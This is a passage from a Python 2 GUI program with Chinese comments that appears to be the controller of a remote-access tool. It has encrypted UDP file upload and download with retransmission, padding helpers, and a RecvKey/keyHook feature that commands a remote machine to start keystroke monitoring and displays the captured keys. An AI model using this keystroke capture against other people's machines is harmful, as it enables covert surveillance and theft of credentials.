                                data = pack[pack.find("|") + 1:]
                                if int(ID) >= start and int(ID) < end:
                                    data_dict[int(ID)] = data
                                    print ("ID " + str(ID) + "get")
                                if_next=True
                                break
                            except socket.timeout:
                                print("Timeout1.")
                                # times=times-1
                                # if times==0:
                                if_next=False
                                break
                            except socket.error:
                                print("socket error.")
                                return
                        if(not if_next):
                            break
                # 若缺包序列不为空，说明有缺包情况，需要进行接收重发包
                else:
                    for i in request_list:
                        # 依次接收数据包
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                # 将序号和数据分离，存入字典
                                pack=pack[2:]
                                ID = pack[:pack.find("|")]
                                data = pack[pack.find("|") + 1:]
                                if int(ID) >= start and int(ID) < end:
                                    print ("re ID " + str(ID) + "get")
                                    data_dict[int(ID)] = data
                                break
                            except socket.timeout:
                                print("Timeout2.")
                                break
                            except socket.error:
                                print("socket error.")
                                return
                print ("Check.")
                flag = True
                # 每组包进行校验
                for i in range(start, end):
                    if i not in data_dict.keys():
                        print ("%d lost" % i)
                        # 发现缺包，标志位置false，并且将序列号添加至缺包序列中
                        flag = False
                        request_list.append(i)
                # 根据标志位判断有无缺包
                if (flag):
                    # 无缺包，说明该组收到的包是完整的，发送finish指令进行确认
                    print "finish."
                    finish="2|finish"
                    finish=str16add(finish)
                    finish=static_AES.encrypt(finish)
                    sock.sendto(finish, Addr)
                    # 按序写入文件
                    for i in range(start, end):
                        try:
                            fp.write(data_dict[i])

                        except KeyError:
                            print ("Key error.")
                            print ("Start=%d,end=%d" % (start, end))
                            print data_dict.keys()
                            return
                        get_size += len(data_dict[i])
                    pen = float(get_size) / file_size
                    canvas.coords(fill_line, (0, 0, pen* 300, 60))
                    pen_text.set(str(int(pen*100))+"%")
                    if pen==1:
                        pen_text.set("下载完成")
                        button_text.set("确定")
                    #canvas.update()
                    print "pen="+str(pen)
                    # 若末尾包序等于总包数，则说明整个文件接收完毕
                    if end == count:
                        print ("All finish.")
                        return
                    # 其它情况则移动首位包序位
                    start += group_len
                    end += group_len
                    # 清空数据字典和缺包序列着两个临时数据区
                    data_dict = {}
                    request_list = []
                # 有缺包情况，发送缺包序列

                else:

                    request="3|"+str(request_list)
                    request=str16add(request)
                    request=static_AES.encrypt(request)
                    sock.sendto(request,Addr)
        return

    def sendFile(self,Addr,file_name,path,canvas,pen_text,button_text):
        # 创建套接字
        self.sendFlag=True
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        # 设置超时时间
        sock.settimeout(time_out)
        fill_line = canvas.create_rectangle(1.5, 1.5, 0, 23, width=0, fill="green")
        # 发送下载文件指令
        cmd="sendFile"
        cmd=str16add(cmd)
        cmd=static_AES.encrypt(cmd)
        sock.sendto(cmd, Addr)
        #file_name = "E:\\test.zip"
        save_path = path+"/"+file_name[file_name.rfind("/")+1:]
        print "save_path="+save_path
        file_size = 0
        try:
            file_size = os.stat(file_name).st_size
        except:
            print("Open file failed.")
            return
        info = "0|"+str(file_size) + "|" + save_path
        info=str16add(info)
        info=static_AES.encrypt(info)
        sock.sendto(info, Addr)
        while (True):
            try:
                reply,addr = sock.recvfrom(65535)
                reply=static_AES.decrypt(reply)
                reply=str16del(reply)
                break
            except socket.timeout:
                print("timeout1.")
                continue
            except socket.error:
                print ("socket error.")
                return
        if (reply == "open failed"):
            print("save path error!")
            return
        if reply == "start":
            print("Start.")

        '''5.10 22:49'''
        group_len = 100
        # 每个包数据长度，单位字节
        pack_len = 60000
        # 首位初始包序
        start = 0
        end = start + group_len
        # 数据包总数，等于最大包序减1
        count = int(math.ceil(float(file_size) / pack_len))
        # 缺包序列列表，初始为空
        request_list = []
        # 打开文件
        sent_size=0
        with open(file_name, "rb") as fp:
            counter = 100
            while (self.sendFlag):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if count < end:
                    print "end"
                    end = count
                    counter = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if (len(request_list) == 0):
                    # 按序读取文件
                    #正确归为指针
                    fp.seek(start*pack_len)
                    for id in range(start, end):
                        data = fp.read(pack_len)
                        try:
                            # 每个包以 序号|数据 的形式发送
                            f_data="1|"+str(id) + "|" + data
                            f_data=str16add(f_data)
                            f_data=static_AES.encrypt(f_data)
                            sock.sendto(f_data, Addr)
                            print ("sent id:" + str(id)+" Addr="+str(Addr))
                        except socket.error:
                            print ("socket error2")
                            continue
                # 若缺包列表为不为空，说明接收端要求进行指定包的重发
                else:
                    print ("重发")
                    # 记录当前文件指针
                    place = fp.tell()
                    # 取出缺包的每个序列
                    for item in request_list:
                        item = int(item)
                        # 重新移动文件指针，读取数据并按格式发送
                        fp.seek(item * pack_len)
                        file_data=fp.read(pack_len)
                        data = "1|"+str(item) + "|" + file_data
                        data=str16add(data)
                        data=static_AES.encrypt(data)
                        try:
                            sock.sendto(data, Addr)
                            print ("retry id %d sent." % item)
                        except socket.timeout:
                            print("timeout1.")
                        except socket.error:
                            print("socket error2.Client is exit.")
                            fp.close()
                            return
                    # 重发完毕，数据指针还原归位
                    fp.seek(place)
                # 接收接受端的反馈信息
                reply=""
                while (True):
                    try:
                        reply, addr = sock.recvfrom(2048)
                        reply=static_AES.decrypt(reply)
                        reply=str16del(reply)
                        print (reply)
                        break
                    except socket.timeout:
                        print("Timeout2")
                        break
                    except socket.error:
                        print("socket error3.Client is exit.")
                        fp.close()
                        return
                # 如果收到finish指令，说明当前组数据包全部成功接收
                if (not reply):
                    print "reply is null."
                    continue
                if (reply.startswith("2")):
                    # 尾包序等于总包数，说明文件以发送完毕
                    sent_size=float(fp.tell())
                    pen=sent_size/file_size
                    canvas.coords(fill_line, (0, 0, pen * 300, 60))
                    pen_text.set(str(int(pen * 100)) + "%")
                    if pen == 1:
                        pen_text.set("上传完成")
                        button_text.set("确定")
                    if end == count:
                        print ("All finish.")
                        start=0
                        end=start+group_len
                        return
                    # 否则移动首尾包序，清空缺包列表，准备接收下一组
                    start += group_len
                    end += group_len
                    request_list = []
                # 收到的不是finish指令，则收到的是缺包列表
                if (reply.startswith("3")):
                    # 转换为列表
                    reply=reply[2:]
                    request_list = reply.strip("[]").split(",")
                    print (request_list)

class RecvKey:
    flag=True
    def __int__(self):
        self.flag=True

    def run(self,Addr,textview):
        time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
        tip="\n\n"+time_now+"  按键监控程序已启动\n"
        textview.config(state=tk.NORMAL)
        textview.insert(tk.END, tip)
        textview.config(state=tk.DISABLED)
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.settimeout(1)
        cmd = "keyHook"
        cmd = str16add(cmd)
        cmd = static_AES.encrypt(cmd)
        sock.sendto(cmd, Addr)
        reply = "ok"
        reply = str16add(reply)
        reply = static_AES.encrypt(reply)
        while(self.flag):
            try:
                data, addr = sock.recvfrom(65535)
                print Addr
                sock.sendto(reply, Addr)
                print "send ok"
                data = static_AES.decrypt(data)
                data = str16del(data)
                data=data[2:]
                textview.config(state=tk.NORMAL)
                textview.insert(tk.END,data)
                textview.config(state=tk.DISABLED)
            except :
                print("timeout.")
                continue

        return
    def stop(self,textview):
        self.flag=False
        time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
        tip = "\n\n" + time_now + "  按键监控程序已关闭\n"
        textview.config(state=tk.NORMAL)
        textview.insert(tk.END, tip)
        textview.config(state=tk.DISABLED)

def HexToBin(hex):
    msg = ""
    for char in hex:
        temp = bin(int(char, 16))[2:]
        if len(temp) < 4:
            msg += '0' * (4-len(temp))
        msg += temp
    return msg

def keyHook(cmd,Addr):
    #创建socket，UDP
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,0)
    reply=""
    while(1):
        try:
            sock.sendto(cmd,Addr)#发送命令
        except:
            print ("Send failed.")
            break
        try:
            reply,addr=sock.recvfrom(1024)#接收回复包
        except:
            pass
        if (reply=="OK"):
            print("command finish.")
            break
        if(reply=="NO"):
            print("command failed,trying again now... ")
        else:
            print ("Send failed.")
            break
    sock.close()#关闭socket


def BinToHex(bin):
    msg = ""
    i = 0
    while(i < len(bin)):
        msg += hex(int(bin[i:i+4], 2))[2:]
        i += 4
    return msg


def IntToBin128(num):
    bin=""
    s=int(num)
    r=0
    while(True):
        r=s%2
        s=s/2
        bin=str(r)+bin
        if s==0:
            break
    bin=(128-len(bin))*"0"+bin
    return bin

#将字符串扩展为16字节的整数倍，及128比特位的整数倍
def str16add(in_str):
    r=len(in_str)%16
        #分界符为"|",不足则以"*"补全
    return in_str+"|"+(15-r)*"*"

#将补全的字符串还原
def str16del(in_str):
    place=in_str.rfind("|")
    return in_str[:place]

def num2key(num):
    bin=IntToBin128(num)
    hex=BinToHex(bin)
    key=binascii.unhexlify(hex)
    return key
#窗口居中，设置长宽
def set_center(win,width,height):
    nScreenWid, nScreenHei = win.maxsize()
    win.geometry(
        "{}x{}+{}+{}".format(width, height, nScreenWid / 2 - width / 2, nScreenHei / 2 - height / 2)
    )
def main():
    app=APP()
    app.MainW()
    app.mainloop()

if __name__=="__main__":
    main()